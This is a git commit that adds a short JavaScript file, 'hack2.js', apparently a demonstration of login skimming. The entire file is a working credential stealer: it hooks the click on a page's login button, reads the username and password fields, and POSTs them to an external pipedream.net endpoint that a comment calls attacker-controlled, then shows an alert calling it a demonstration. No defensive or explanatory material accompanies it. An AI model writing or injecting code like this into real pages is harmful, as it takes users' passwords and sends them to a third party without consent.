bbb60e73b9c78af73f9f69bdd9ee060cdc98e4ea
Mohamed fazil <137870819+MohamedFazil89@users.noreply.github.com>
2023-11-05 17:48:47 +0530

    Add files via upload

---
+++ hack2.js
@@ -0,0 +1,20 @@
+function captureCredentialsOnClick() {
+    // Attach an event listener to a real login button or form submission
+    const loginButton = document.getElementById('login'); // Replace 'loginButton' with the actual ID or selector for your login button
+    loginButton.addEventListener('click', function() {
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+  
+      // Send the captured data to an attacker-controlled server (for demonstration purposes only)
+      fetch('https://eoez9dunc2u7wj9.m.pipedream.net', {
+        method: 'POST',
+        body: JSON.stringify({ username, password }),
+        headers: { 'Content-Type': 'application/json' },
+      }).then(() => {
+        alert('Your credentials have been captured. This was a demonstration and not a real attack.');
+      });
+    });
+  }
+  
+  // Call the function to capture credentials when the user clicks the login button
+  
